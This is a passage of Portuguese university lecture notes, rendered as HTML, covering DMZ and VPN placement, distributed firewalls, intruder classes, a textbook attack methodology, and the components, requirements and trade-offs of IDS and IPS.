slnt-0 step-1">a</span><span class="cut mono-0 wght-2 slnt-0 step-2">l</span><span class="cut mono-5 wght-2 slnt-0 step-1">i</span><span class="cut mono-1 wght-2 slnt-4 step-0">z</span><span class="cut mono-5 wght-1 slnt-3 step-3">a</span><span class="cut mono-5 wght-5 slnt-5 step-1">ç</span><span class="cut mono-0 wght-0 slnt-5 step-1">õ</span><span class="cut mono-0 wght-1 slnt-0 step-1">e</span><span class="cut mono-5 wght-2 slnt-1 step-0">s</span><span class="cut mono-2 wght-4 slnt-0 step-0">:</span> <span class="cut mono-0 wght-2 slnt-2 step-3">D</span><span class="cut mono-0 wght-1 slnt-4 step-2">M</span><span class="cut mono-4 wght-3 slnt-3 step-2">Z</span><span class="cut mono-4 wght-2 slnt-1 step-2">,</span> <span class="cut mono-4 wght-2 slnt-1 step-1">V</span><span class="cut mono-2 wght-2 slnt-4 step-0">P</span><span class="cut mono-5 wght-4 slnt-3 step-0">N</span> <span class="cut mono-0 wght-5 slnt-5 step-1">e</span> <span class="cut mono-1 wght-0 slnt-5 step-0">f</span><span class="cut mono-4 wght-5 slnt-2 step-0">i</span><span class="cut mono-2 wght-3 slnt-0 step-1">r</span><span class="cut mono-4 wght-1 slnt-2 step-0">e</span><span class="cut mono-0 wght-4 slnt-5 step-2">w</span><span class="cut mono-2 wght-0 slnt-0 step-3">a</span><span class="cut mono-5 wght-3 slnt-1 step-0">l</span><span class="cut mono-2 wght-2 slnt-3 step-0">l</span><span class="cut mono-0 wght-3 slnt-3 step-1">s</span> <span class="cut mono-1 wght-1 slnt-2 step-2">d</span><span class="cut mono-4 wght-1 slnt-5 step-0">i</span><span class="cut mono-3 wght-3 slnt-5 step-3">s</span><span class="cut mono-4 wght-1 slnt-4 step-1">t</span><span class="cut mono-2 wght-5 slnt-4 step-0">r</span><span class="cut mono-1 wght-5 slnt-4 step-3">i</span><span class="cut mono-0 wght-1 slnt-0 step-2">b</span><span class="cut mono-0 wght-5 slnt-1 step-3">u</span><span class="cut mono-2 wght-5 slnt-2 step-3">í</span><span class="cut mono-3 wght-5 slnt-5 step-0">d</span><span class="cut mono-5 wght-5 slnt-4 step-3">o</span><span class="cut mono-5 wght-5 slnt-2 step-1">s</span> <a class="header-anchor" href="#_1-12-localizacoes-dmz-vpn-e-firewalls-distribuidos" aria-hidden="true">#</a></h3><p><strong>DMZ (slides 502 e 503):</strong> um segmento de rede extra entre um <strong>firewall externo</strong> na borda da rede (logo depois do roteador de borda da Internet ou da WAN) e um ou mais <strong>firewalls internos</strong> que protegem a maior parte da rede corporativa. A DMZ contém sistemas que precisam ser alcançáveis de fora mas ainda precisam de proteção: o site corporativo, o servidor de e-mail (SMTP), o servidor DNS. A Figura 9.2 (slide 496) mostra roteador de borda, firewall externo, DMZ com servidores web, e-mail e DNS, firewall interno, depois servidores de aplicação e de banco de dados e estações de trabalho.</p><p>O firewall externo dá controle de acesso moderado aos sistemas da DMZ e proteção básica ao resto. <strong>Três propósitos do firewall interno:</strong></p><ol><li>Filtragem mais estrita que a do externo, para proteger servidores e estações internos.</li><li>Proteção nos dois sentidos em relação à DMZ: protege a rede interna de um servidor da DMZ comprometido (malware, rootkits, bots), e protege a DMZ da rede interna.</li><li>Segmentação interna: vários firewalls internos protegem porções da rede interna umas das outras (servidores contra estações de trabalho).</li></ol><p><strong>VPN (slides 504 a 506):</strong> organizações com LANs dispersas precisam interconectá-las. A Internet pública é mais barata e mais fácil de gerenciar que linhas privadas, mas expõe o tráfego corporativo (escuta, acesso não autorizado). Uma VPN é um conjunto de computadores interconectados por uma rede insegura, usando criptografia e autenticação nas camadas inferiores de protocolo, com o mesmo sistema criptográfico nos dois extremos. O protocolo mais comum é o <strong>IPsec</strong>.</p><p>O dispositivo IPsec (roteador ou firewall) cifra e comprime todo o tráfego para a WAN, e decifra e descomprime todo o tráfego vindo dela, de forma transparente para os hosts da LAN. Um usuário individual remoto pode rodar IPsec na estação de trabalho, que então precisa de alta segurança de host, o que a torna um alvo atraente.</p><p><strong>Onde colocar o IPsec:</strong></p><div class="table-wrapper"><table><thead><tr><th>Posição</th><th>Problema</th></tr></thead><tbody><tr><td>Atrás do firewall (interno)</td><td>Tráfego VPN cifrado: sem filtragem, varredura, registro ou controle</td></tr><tr><td>No roteador de borda</td><td>O roteador é provavelmente menos seguro que o firewall</td></tr><tr><td><strong>No próprio firewall</strong></td><td>A escolha funcional</td></tr></tbody></table></div><p><strong>Firewalls distribuídos (slide 507):</strong> firewalls de rede autônomos mais firewalls baseados em host em servidores e estações de trabalho, trabalhando juntos sob <strong>controle administrativo central</strong>. Os administradores configuram centenas de firewalls de host e firewalls pessoais, locais e remotos, e monitoram a segurança por toda a rede. Vantagens: proteção contra ataques internos, e proteção ajustada a máquinas e aplicações específicas.</p><p>Material externo:</p><ul><li>NIST CSRC, artigo: <a href="https://csrc.nist.gov/pubs/sp/800/41/r1/final" target="_blank" rel="noopener">SP 800-41 Rev. 1, Guidelines on Firewalls and Firewall Policy</a> A publicação que os slides citam para as características da política e as fraquezas do filtro de pacotes.</li><li>IETF, artigo: <a href="https://www.rfc-editor.org/rfc/rfc1928" target="_blank" rel="noopener">RFC 1928, SOCKS Protocol Version 5</a> O padrão do proxy de circuito, com o handshake da porta 1080.</li></ul><hr><h2 id="parte-2-deteccao-e-prevencao-de-intrusao-aula-15" tabindex="-1"><span class="cut mono-1 wght-1 slnt-5 step-2">P</span><span class="cut mono-5 wght-1 slnt-2 step-1">A</span><span class="cut mono-0 wght-4 slnt-4 step-1">R</span><span class="cut mono-2 wght-5 slnt-2 step-2">T</span><span class="cut mono-3 wght-5 slnt-0 step-1">E</span> <span class="cut mono-2 wght-5 slnt-3 step-1">2</span><span class="cut mono-2 wght-3 slnt-2 step-1">:</span> <span class="cut mono-1 wght-4 slnt-0 step-2">D</span><span class="cut mono-1 wght-3 slnt-2 step-0">e</span><span class="cut mono-4 wght-0 slnt-3 step-2">t</span><span class="cut mono-4 wght-3 slnt-5 step-3">e</span><span class="cut mono-2 wght-3 slnt-1 step-2">c</span><span class="cut mono-2 wght-2 slnt-0 step-0">ç</span><span class="cut mono-3 wght-2 slnt-4 step-1">ã</span><span class="cut mono-2 wght-0 slnt-2 step-0">o</span> <span class="cut mono-3 wght-4 slnt-2 step-1">e</span> <span class="cut mono-0 wght-1 slnt-0 step-3">p</span><span class="cut mono-3 wght-1 slnt-5 step-0">r</span><span class="cut mono-4 wght-1 slnt-0 step-3">e</span><span class="cut mono-0 wght-3 slnt-5 step-3">v</span><span class="cut mono-4 wght-5 slnt-4 step-2">e</span><span class="cut mono-1 wght-3 slnt-3 step-2">n</span><span class="cut mono-1 wght-5 slnt-4 step-1">ç</span><span class="cut mono-3 wght-4 slnt-0 step-2">ã</span><span class="cut mono-4 wght-0 slnt-4 step-0">o</span> <span class="cut mono-5 wght-2 slnt-5 step-1">d</span><span class="cut mono-1 wght-5 slnt-3 step-0">e</span> <span class="cut mono-0 wght-4 slnt-2 step-3">i</span><span class="cut mono-5 wght-4 slnt-4 step-2">n</span><span class="cut mono-1 wght-1 slnt-2 step-2">t</span><span class="cut mono-1 wght-2 slnt-1 step-1">r</span><span class="cut mono-4 wght-3 slnt-3 step-2">u</span><span class="cut mono-5 wght-1 slnt-5 step-0">s</span><span class="cut mono-3 wght-0 slnt-0 step-1">ã</span><span class="cut mono-5 wght-5 slnt-0 step-2">o</span> <span class="cut mono-5 wght-5 slnt-4 step-0">(</span><span class="cut mono-2 wght-5 slnt-2 step-1">A</span><span class="cut mono-4 wght-0 slnt-2 step-2">u</span><span class="cut mono-3 wght-5 slnt-3 step-3">l</span><span class="cut mono-0 wght-1 slnt-3 step-1">a</span> <span class="cut mono-2 wght-2 slnt-0 step-0">1</span><span class="cut mono-1 wght-3 slnt-2 step-3">5</span><span class="cut mono-0 wght-0 slnt-3 step-2">)</span> <a class="header-anchor" href="#parte-2-deteccao-e-prevencao-de-intrusao-aula-15" aria-hidden="true">#</a></h2><h3 id="_2-1-intrusos" tabindex="-1"><span class="cut mono-1 wght-3 slnt-1 step-2">2</span><span class="cut mono-5 wght-5 slnt-5 step-2">.</span><span class="cut mono-4 wght-3 slnt-1 step-1">1</span> <span class="cut mono-3 wght-4 slnt-3 step-2">I</span><span class="cut mono-4 wght-5 slnt-0 step-2">n</span><span class="cut mono-5 wght-5 slnt-2 step-0">t</span><span class="cut mono-0 wght-4 slnt-3 step-0">r</span><span class="cut mono-1 wght-4 slnt-0 step-0">u</span><span class="cut mono-4 wght-2 slnt-1 step-0">s</span><span class="cut mono-3 wght-4 slnt-4 step-2">o</span><span class="cut mono-0 wght-4 slnt-3 step-1">s</span> <a class="header-anchor" href="#_2-1-intrusos" aria-hidden="true">#</a></h3><p>Intrusos são uma das principais ameaças (slide 510). A maioria das violações vem de <strong>externos</strong>, algumas de <strong>internos</strong>, e os internos podem ser muito mais perigosos. Ataques direcionados podem contornar as defesas de perímetro (firewalls), então defesa em profundidade é necessária.</p><p><strong>Quatro classes de intruso (slides 511 e 512):</strong></p><ol><li><strong>Criminosos cibernéticos.</strong> Motivação: recompensa financeira. Atividades: roubo de identidade, roubo de credenciais financeiras, espionagem corporativa, roubo ou resgate de dados. Organizam-se em fóruns clandestinos (DarkMarket) para negociar dados e coordenar ataques.</li><li><strong>Ativistas.</strong> Motivação: causas sociais ou políticas. Nível de habilidade muitas vezes baixo. Atividades: pichação de site, DoS, vazamento de dados. Exemplos: Anonymous, LulzSec, Manning, Snowden.</li><li><strong>APTs (ameaças persistentes avançadas).</strong> Grupos de hackers patrocinados por governos. Motivação: espionagem ou sabotagem. O nome vem do sigilo e da persistência por longos períodos. Difundidos: China, Rússia, EUA, Reino Unido.</li><li><strong>Outros.</strong> Hackers clássicos, motivados pelo desafio técnico ou pela reputação no grupo; descobrem novas vulnerabilidades, como estouro de buffer. Hackers amadores usam kits de ataque prontos e podem ser recrutados pelas outras classes.</li></ol><p><strong>Exemplos de intrusão, NIST SP 800-61 (slides 513 e 514):</strong> comprometimento remoto de root de um servidor de correio; pichação de servidor web; adivinhar e quebrar senhas; copiar um banco de dados de números de cartão de crédito; ver dados sensíveis (folha de pagamento, prontuários médicos) sem autorização; rodar um sniffer de pacotes em uma estação para capturar nomes de usuário e senhas; usar um erro de permissão em um servidor FTP anônimo para distribuir software e música piratas; acessar um sistema inseguro para alcançar a rede interna; engenharia social.</p><h3 id="_2-2-papel-e-limites-de-ids-e-ips" tabindex="-1"><span class="cut mono-2 wght-2 slnt-0 step-3">2</span><span class="cut mono-0 wght-3 slnt-1 step-2">.</span><span class="cut mono-3 wght-3 slnt-2 step-1">2</span> <span class="cut mono-0 wght-4 slnt-3 step-2">P</span><span class="cut mono-3 wght-5 slnt-1 step-3">a</span><span class="cut mono-4 wght-4 slnt-1 step-2">p</span><span class="cut mono-0 wght-4 slnt-4 step-2">e</span><span class="cut mono-3 wght-5 slnt-2 step-2">l</span> <span class="cut mono-3 wght-0 slnt-5 step-3">e</span> <span class="cut mono-1 wght-1 slnt-0 step-0">l</span><span class="cut mono-0 wght-4 slnt-5 step-3">i</span><span class="cut mono-5 wght-3 slnt-1 step-1">m</span><span class="cut mono-5 wght-2 slnt-4 step-1">i</span><span class="cut mono-0 wght-0 slnt-2 step-0">t</span><span class="cut mono-5 wght-3 slnt-0 step-2">e</span><span class="cut mono-5 wght-1 slnt-4 step-2">s</span> <span class="cut mono-2 wght-2 slnt-3 step-3">d</span><span class="cut mono-2 wght-2 slnt-5 step-0">e</span> <span class="cut mono-3 wght-1 slnt-2 step-3">I</span><span class="cut mono-4 wght-2 slnt-4 step-0">D</span><span class="cut mono-4 wght-2 slnt-3 step-0">S</span> <span class="cut mono-5 wght-4 slnt-1 step-1">e</span> <span class="cut mono-4 wght-5 slnt-2 step-3">I</span><span class="cut mono-3 wght-2 slnt-3 step-3">P</span><span class="cut mono-4 wght-3 slnt-3 step-1">S</span> <a class="header-anchor" href="#_2-2-papel-e-limites-de-ids-e-ips" aria-hidden="true">#</a></h3><p><strong>IDS:</strong> sistema de detecção de intrusão. <strong>IPS:</strong> sistema de prevenção de intrusão (slide 515).</p><ul><li><strong>Onde funcionam bem:</strong> razoavelmente eficazes contra ataques conhecidos, menos sofisticados, por exemplo grupos ativistas ou golpes de e-mail em larga escala.</li><li><strong>Onde falham:</strong> menos eficazes contra ataques direcionados sofisticados, de criminosos cibernéticos ou APTs patrocinadas por estados, porque esses atacantes usam <strong>exploits de dia zero</strong> e sabem esconder sua atividade no sistema.</li><li><strong>Defesa em profundidade:</strong> o IDS/IPS precisa fazer parte de uma estratégia que inclui criptografia, trilhas de auditoria, autenticação forte e gerência ativa de segurança.</li></ul><h3 id="_2-3-a-metodologia-de-ataque" tabindex="-1"><span class="cut mono-1 wght-1 slnt-2 step-1">2</span><span class="cut mono-5 wght-4 slnt-1 step-2">.</span><span class="cut mono-5 wght-5 slnt-5 step-1">3</span> <span class="cut mono-1 wght-5 slnt-1 step-2">A</span> <span class="cut mono-5 wght-0 slnt-5 step-2">m</span><span class="cut mono-2 wght-5 slnt-4 step-3">e</span><span class="cut mono-5 wght-4 slnt-2 step-2">t</span><span class="cut mono-4 wght-5 slnt-0 step-2">o</span><span class="cut mono-3 wght-5 slnt-2 step-1">d</span><span class="cut mono-1 wght-3 slnt-1 step-2">o</span><span class="cut mono-5 wght-0 slnt-5 step-0">l</span><span class="cut mono-4 wght-5 slnt-1 step-1">o</span><span class="cut mono-4 wght-2 slnt-1 step-2">g</span><span class="cut mono-2 wght-4 slnt-5 step-0">i</span><span class="cut mono-2 wght-1 slnt-2 step-0">a</span> <span class="cut mono-1 wght-5 slnt-5 step-0">d</span><span class="cut mono-1 wght-0 slnt-4 step-2">e</span> <span class="cut mono-3 wght-5 slnt-4 step-3">a</span><span class="cut mono-0 wght-5 slnt-5 step-3">t</span><span class="cut mono-5 wght-2 slnt-0 step-3">a</span><span class="cut mono-1 wght-0 slnt-0 step-3">q</span><span class="cut mono-3 wght-5 slnt-5 step-1">u</span><span class="cut mono-1 wght-3 slnt-1 step-1">e</span> <a class="header-anchor" href="#_2-3-a-metodologia-de-ataque" aria-hidden="true">#</a></h3><p>O comportamento do intruso muda constantemente, mas existe uma metodologia comum (slide 516): <strong>phishing, instalação de malware, roubo de credenciais, comprometimento.</strong> Seis passos:</p><ol><li><strong>Aquisição do alvo e coleta de informação</strong> (slides 516 e 519). OSINT (inteligência de fontes abertas), informação pública, ferramentas de mapeamento de rede. Objetivo: identificar e caracterizar os sistemas alvo. Exemplos: explorar o site corporativo (estrutura, equipe, SO); consulta DNS (dig, host) e WHOIS; mapear serviços com NMAP; enviar um e-mail de sondagem (ao atendimento) para analisar o cliente e o servidor de correio; identificar serviços vulneráveis como um CMS web.</li><li><strong>Acesso inicial.</strong> Explorar uma vulnerabilidade remota de rede, explorar credenciais fracas, ou instalar malware por engenharia social ou download direcionado. Exemplos: força bruta na senha do CMS; explorar um plugin do CMS; e-mail de spear-phishing direcionado com link para um exploit de navegador.</li><li><strong>Escalação de privilégio</strong> (slides 517 e 520). Ações dentro do sistema após o acesso inicial, explorando vulnerabilidades de acesso local para elevar os privilégios do atacante. Exemplos: varrer o sistema em busca de aplicações com exploits locais; explorar um para obter root ou admin; instalar sniffers para capturar senhas de administrador; usá-las para alcançar informação privilegiada.</li><li><strong>Coleta de informação ou exploração do sistema.</strong> Acessar ou modificar informação e recursos; possivelmente mover-se para outro alvo (movimentação lateral). Exemplos: varrer arquivos em busca de dados financeiros ou PII; transferir muitos documentos para um repositório externo (exfiltração); usar senhas capturadas em outros servidores.</li><li><strong>Manutenção do acesso</strong> (slides 518 e 521). Persistência: backdoors ou outro malware, credenciais de autenticação secretas, outras mudanças de configuração. Exemplos: instalar uma ferramenta de administração remota (RAT) ou um rootkit com backdoor; reusar a senha de admin capturada depois; modificar ou desabilitar antivírus ou IDS no sistema.</li><li><strong>Apagar rastros.</strong> Desabilitar ou editar logs de auditoria para remover evidências; rootkits escondem arquivos e código. Exemplos: esconder o RAT e os sniffers com um rootkit; editar arquivos de log para remover as entradas geradas durante a intrusão.</li></ol><h3 id="_2-4-definicoes-e-componentes-de-um-ids" tabindex="-1"><span class="cut mono-2 wght-1 slnt-3 step-2">2</span><span class="cut mono-2 wght-3 slnt-1 step-3">.</span><span class="cut mono-0 wght-2 slnt-3 step-2">4</span> <span class="cut mono-2 wght-3 slnt-4 step-2">D</span><span class="cut mono-5 wght-3 slnt-0 step-1">e</span><span class="cut mono-4 wght-3 slnt-1 step-2">f</span><span class="cut mono-1 wght-0 slnt-1 step-0">i</span><span class="cut mono-4 wght-5 slnt-4 step-0">n</span><span class="cut mono-2 wght-4 slnt-5 step-3">i</span><span class="cut mono-0 wght-4 slnt-4 step-2">ç</span><span class="cut mono-4 wght-4 slnt-0 step-3">õ</span><span class="cut mono-5 wght-0 slnt-0 step-2">e</span><span class="cut mono-2 wght-0 slnt-5 step-0">s</span> <span class="cut mono-0 wght-4 slnt-2 step-0">e</span> <span class="cut mono-4 wght-3 slnt-4 step-1">c</span><span class="cut mono-5 wght-1 slnt-1 step-2">o</span><span class="cut mono-3 wght-1 slnt-4 step-3">m</span><span class="cut mono-2 wght-4 slnt-4 step-2">p</span><span class="cut mono-4 wght-1 slnt-1 step-0">o</span><span class="cut mono-1 wght-1 slnt-2 step-1">n</span><span class="cut mono-3 wght-4 slnt-1 step-1">e</span><span class="cut mono-4 wght-2 slnt-5 step-2">n</span><span class="cut mono-5 wght-2 slnt-3 step-3">t</span><span class="cut mono-5 wght-4 slnt-1 step-3">e</span><span class="cut mono-4 wght-2 slnt-0 step-1">s</span> <span class="cut mono-1 wght-3 slnt-1 step-1">d</span><span class="cut mono-2 wght-5 slnt-2 step-2">e</span> <span class="cut mono-1 wght-1 slnt-3 step-1">u</span><span class="cut mono-3 wght-4 slnt-5 step-0">m</span> <span class="cut mono-3 wght-2 slnt-2 step-1">I</span><span class="cut mono-5 wght-0 slnt-4 step-0">D</span><span class="cut mono-2 wght-2 slnt-2 step-2">S</span> <a class="header-anchor" href="#_2-4-definicoes-e-componentes-de-um-ids" aria-hidden="true">#</a></h3><ul><li><strong>Intrusão de segurança (slide 522):</strong> um ato não autorizado de contornar os mecanismos de segurança de um sistema.</li><li><strong>Detecção de intrusão:</strong> uma função de hardware ou software que coleta e analisa informação de várias áreas dentro de um computador ou rede, para identificar possíveis intrusões de segurança.</li></ul><p><strong>Três componentes lógicos (slide 523):</strong></p><ol><li><strong>Sensores</strong> coletam dados. A entrada pode ser qualquer parte do sistema que contém evidência de intrusão: pacotes de rede, arquivos de log, chamadas de sistema. Eles encaminham ao analisador.</li><li><strong>Analisadores</strong> recebem entrada de um ou mais sensores e decidem se uma intrusão ocorreu. A saída pode incluir evidências e orientação sobre ações. Os dados dos sensores podem ser armazenados para análise posterior.</li><li><strong>Interface de usuário</strong> permite ao administrador ver o sistema ou controlar seu comportamento.</li></ol><p><strong>Arquitetura (slide 524):</strong> simples (um sensor e um analisador, um HIDS ou um NIDS) ou distribuída (vários sensores em hosts e dispositivos de rede alimentando um analisador central).</p><p><strong>Classificação pela fonte de dados:</strong></p><div class="table-wrapper"><table><thead><tr><th>Tipo</th><th>Monitora</th><th>Exemplos</th></tr></thead><tbody><tr><td>HIDS (baseado em host)</td><td>Um host: suas características e os eventos nele</td><td>PIDs, chamadas de sistema</td></tr><tr><td>NIDS (baseado em rede)</td><td>O tráfego de segmentos ou dispositivos específicos</td><td>Tráfego suspeito</td></tr><tr><td>Distribuído ou híbrido</td><td>Vários sensores HIDS e NIDS em um analisador central</td><td>Melhor identificação</td></tr></tbody></table></div><p><strong>IPS:</strong> os slides definem o IPS pelo sensor em linha (slide 552): um sensor pelo qual o tráfego precisa passar, de modo que ele pode <strong>bloquear</strong> um ataque ao detectá-lo. O IDS detecta e alerta; o IPS também previne.</p><h3 id="_2-5-motivacoes-a-suposicao-fundamental-e-o-compromisso" tabindex="-1"><span class="cut mono-5 wght-5 slnt-5 step-1">2</span><span class="cut mono-4 wght-1 slnt-2 step-3">.</span><span class="cut mono-1 wght-0 slnt-0 step-2">5</span> <span class="cut mono-2 wght-0 slnt-5 step-3">M</span><span class="cut mono-2 wght-2 slnt-0 step-1">o</span><span class="cut mono-1 wght-5 slnt-0 step-1">t</span><span class="cut mono-0 wght-1 slnt-1 step-0">i</span><span class="cut mono-1 wght-5 slnt-0 step-1">v</span><span class="cut mono-2 wght-1 slnt-1 step-0">a</span><span class="cut mono-0 wght-0 slnt-3 step-3">ç</span><span class="cut mono-3 wght-4 slnt-1 step-2">õ</span><span class="cut mono-5 wght-0 slnt-4 step-0">e</span><span class="cut mono-5 wght-4 slnt-0 step-3">s</span><span class="cut mono-0 wght-3 slnt-1 step-2">,</span> <span class="cut mono-3 wght-3 slnt-2 step-1">a</span> <span class="cut mono-5 wght-2 slnt-3 step-0">s</span><span class="cut mono-2 wght-0 slnt-2 step-1">u</span><span class="cut mono-2 wght-2 slnt-1 step-0">p</span><span class="cut mono-5 wght-2 slnt-5 step-3">o</span><span class="cut mono-5 wght-0 slnt-4 step-0">s</span><span class="cut mono-2 wght-2 slnt-2 step-0">i</span><span class="cut mono-1 wght-0 slnt-4 step-2">ç</span><span class="cut mono-1 wght-0 slnt-1 step-2">ã</span><span class="cut mono-4 wght-1 slnt-2 step-1">o</span> <span class="cut mono-0 wght-3 slnt-4 step-1">f</span><span class="cut mono-4 wght-2 slnt-1 step-0">u</span><span class="cut mono-2 wght-5 slnt-1 step-2">n</span><span class="cut mono-5 wght-1 slnt-4 step-0">d</span><span class="cut mono-0 wght-2 slnt-0 step-0">a</span><span class="cut mono-2 wght-4 slnt-4 step-0">m</span><span class="cut mono-3 wght-0 slnt-4 step-2">e</span><span class="cut mono-5 wght-2 slnt-1 step-0">n</span><span class="cut mono-2 wght-3 slnt-5 step-0">t</span><span class="cut mono-4 wght-2 slnt-2 step-2">a</span><span class="cut mono-1 wght-5 slnt-5 step-1">l</span> <span class="cut mono-5 wght-0 slnt-5 step-1">e</span> <span class="cut mono-2 wght-3 slnt-2 step-2">o</span> <span class="cut mono-0 wght-5 slnt-4 step-3">c</span><span class="cut mono-3 wght-2 slnt-4 step-3">o</span><span class="cut mono-0 wght-3 slnt-4 step-1">m</span><span class="cut mono-0 wght-1 slnt-3 step-0">p</span><span class="cut mono-4 wght-3 slnt-5 step-1">r</span><span class="cut mono-0 wght-5 slnt-2 step-0">o</span><span class="cut mono-1 wght-2 slnt-1 step-1">m</span><span class="cut mono-4 wght-5 slnt-5 step-0">i</span><span class="cut mono-5 wght-0 slnt-5 step-3">s</span><span class="cut mono-3 wght-2 slnt-0 step-3">s</span><span class="cut mono-3 wght-0 slnt-0 step-2">o</span> <a class="header-anchor" href="#_2-5-motivacoes-a-suposicao-fundamental-e-o-compromisso" aria-hidden="true">#</a></h3><p><strong>Três motivações (slide 525):</strong></p><ol><li><strong>Detecção rápida.</strong> Detectado cedo o bastante, o intruso é expulso antes do dano. Mesmo quando não a tempo de impedir, detecção mais cedo significa menos dano e recuperação mais rápida.</li><li><strong>Efeito dissuasório.</strong> Um IDS eficaz desencoraja ataques, o que previne intrusões.</li><li><strong>Coleta de informação.</strong> Dados sobre técnicas de intrusão fortalecem a prevenção (regras de firewall, correções).</li></ol><p><strong>A suposição fundamental (slide 526):</strong> o comportamento de um intruso difere do comportamento de um usuário legítimo de formas que podem ser quantificadas. Não há uma distinção nítida entre um ataque e o uso normal. Existe alguma <strong>sobreposição</strong>, e o trabalho do analisador é minimizá-la.</p><p><strong>O compromisso (slide 527):</strong></p><div class="table-wrapper"><table><thead><tr><th>Interpretação</th><th>Tenta</th><th>Resultado</th></tr></thead><tbody><tr><td>Frouxa</td><td>Pegar o máximo possível de intrusos</td><td>Muitos <strong>falsos positivos</strong>: usuários vistos como intrusos</td></tr><tr><td>Estrita</td><td>Limitar os falsos positivos</td><td>Mais <strong>falsos negativos</strong>: intrusos não detectados</td></tr></tbody></table></div><p>O ideal: maximizar a taxa de detecção e minimizar a taxa de falsos alarmes. A prática de IDS é um compromisso e uma arte.</p><p><strong>A visão clássica (slide 528):</strong> externos podem ser distinguidos de usuários legítimos com confiança razoável, porque os padrões de comportamento legítimo vêm do histórico, e desvios significativos (anomalias) são detectáveis. <strong>Internos</strong> são o caso mais difícil (Anderson): a diferença entre o comportamento anormal e normal de um interno pode ser muito pequena, então a busca de anomalias sozinha é insuficiente. Solução sugerida: uma definição inteligente de condições (regras) que sugerem uso não autorizado.</p><p><strong>A falácia da taxa-base (slide 529):</strong> os dois objetivos, alta taxa de detecção e baixa taxa de falsos alarmes, são extremamente difíceis de alcançar juntos. O número real de intrusões (a taxa-base) é muito baixo comparado ao uso legítimo. A menos que o IDS seja extremamente discriminante, quase perfeito, a taxa de falsos alarmes será alta. Falsos alarmes frequentes fazem os gestores ignorá-los, ou gastar muito tempo analisando-os. Uma taxa de detecção baixa dá uma falsa sensação de segurança.</p><h3 id="_2-6-requisitos-de-um-ids" tabindex="-1"><span class="cut mono-0 wght-2 slnt-1 step-3">2</span><span class="cut mono-1 wght-2 slnt-5 step-2">.</span><span class="cut mono-1 wght-3 slnt-4 step-0">6</span> <span class="cut mono-3 wght-0 slnt-4 step-3">R</span><span class="cut mono-2 wght-4 slnt-4 step-3">e</span><span class="cut mono-5 wght-3 slnt-3 step-1">q</span><span class="cut mono-1 wght-4 slnt-1 step-3">u</span><span class="cut mono-4 wght-0 slnt-2 step-2">i</span><span class="cut mono-0 wght-2 slnt-4 step-1">s</span><span class="cut mono-4 wght-0 slnt-1 step-3">i</span><span class="cut mono-5 wght-0 slnt-0 step-1">t</span><span class="cut mono-2 wght-2 slnt-1 step-1">o</span><span class="cut mono-2 wght-0 slnt-5 step-2">s</span> <span class="cut mono-4 wght-1 slnt-4 step-1">d</span><span class="cut mono-0 wght-1 slnt-5 step-2">e</span> <span class="cut mono-1 wght-0 slnt-0 step-0">u</span><span class="cut mono-0 wght-4 slnt-4 step-0">m</span> <span class="cut mono-2 wght-3 slnt-4 step-0">I</span><span class="cut mono-0 wght-0 slnt-2 step-3">D</span><span class="cut mono-4 wght-3 slnt-0 step-2">S</span> <a class="header-anchor" href="#_2-6-requisitos-de-um-ids" aria-hidden="true">#</a></h3><p>Nove requisitos (slides 530 e 531). Um IDS deve:</p><ol><li>Rodar continuamente com supervisão humana mínima.</li><li>Ser tolerante a falhas: recuperar-se de quedas e reinicializações.</li><li>Resistir a subversão: monitorar a si mesmo e detectar modificação por um atacante.</li><li>Impor sobrecarga mínima ao sistema monitorado.</li><li>Ser configurável conforme as políticas de segurança do sistema monitorado.</li><li>Adaptar-se a mudanças no comportamento do sistema e dos usuários ao longo do tempo.</li><li>Escalar para monitorar um grande número de hosts.</li><li>Evitar uma parada completa do serviço: se alguns componentes param, o resto é afetado o mínimo possível.</li><li>Permitir reconfiguração dinâmica sem reinicialização.</li></ol><h3 id="_2-7-abordagens-de-analise-anomalia-e-assinatura" tabindex="-1"><span class="cut mono-4 wght-5 slnt-4 step-3">2</span><span class="cut mono-5 wght-1 slnt-4 step-0">.</span><span class="cut mono-5 wght-1 slnt-5 step-2">7</span> <span class="cut mono-3 wght-5 slnt-1 step-1">A</span><span class="cut mono-3 wght-0 slnt-0 step-2">b</span><span class="cut mono-0 wght-1 slnt-5 step-3">o</span><span class="cut mono-2 wght-1 slnt-3 step-2">r</span><span class="cut mono-4 wght-0 slnt-2 step-1">d</span><span class="cut mono-4 wght-1 slnt-5 step-2">a</span><span class="cut mono-5 wght-2 slnt-3 step-1">g</span><span class="cut mono-4 wght-3 slnt-4 step-3">e</span><span class="cut mono-2 wght-0 slnt-2 step-2">n</span><span class="cut mono-3 wght-1 slnt-1 step-1">s</span> <span class="cut mono-2 wght-4 slnt-4 step-1">d</span><span class="cut mono-3 wght-4 slnt-2 step-2">e</span> <span class="cut mono-3 wght-5 slnt-1 step-3">a</span><span class="cut mono-1 wght-3 slnt-1 step-1">n</span><span class="cut mono-0 wght-0 slnt-0 step-1">á</span><span class="cut mono-4 wght-4 slnt-2 step-2">l</span><span class="cut mono-5 wght-1 slnt-2 step-2">i</span><span class="cut mono-3 wght-3 slnt-1 step-2">s</span><span class="cut mono-2 wght-1 slnt-3 step-2">e</span><span class="cut mono-0 wght-5 slnt-1 step-0">:</span> <span class="cut mono-5 wght-5 slnt-5 step-1">a</span><span class="cut mono-1 wght-4 slnt-3 step-1">n</span><span class="cut mono-1 wght-0 slnt-2 step-3">o</span><span class="cut mono-0 wght-1 slnt-1 step-1">m</span><span class="cut mono-1 wght-3 slnt-5 step-1">a</span><span class="cut mono-2 wght-0 slnt-3 step-1">l</span><span class="cut mono-3 wght-2 slnt-4 step-0">i</span><span class="cut mono-1 wght-2 slnt-5 step-3">a</span> <span class="cut mono-1 wght-4 slnt-0 step-0">e</span> <span class="cut mono-5 wght-5 slnt-5 step-1">a</span><span class="cut mono-5 wght-2 slnt-4 step-1">s</span><span class="cut mono-3 wght-3 slnt-2 step-1">s</span><span class="cut mono-2 wght-2 slnt-4 step-0">i</span><span class="cut mono-1 wght-1 slnt-0 step-2">n</span><span class="cut mono-0 wght-0 slnt-0 step-1">a</span><span class="cut mono-2 wght-0 slnt-2 step-2">t</span><span class="cut mono-1 wght-3 slnt-2 step-3">u</span><span class="cut mono-4 wght-0 slnt-5 step-0">r</span><span class="cut mono-1 wght-0 slnt-1 step-3">a</span> <a class="header-anchor" href="#_2-7-abordagens-de-analise-anomalia-e-assinatura" aria-hidden="true">#</a></h3><p>Duas abordagens (slide 532): <strong>detecção de anomalia</strong> e <strong>detecção por assinatura ou heurística</strong>.</p><p><strong>Detecção de anomalia (slides 533 e 534):</strong> coletar dados sobre o comportamento de usuários 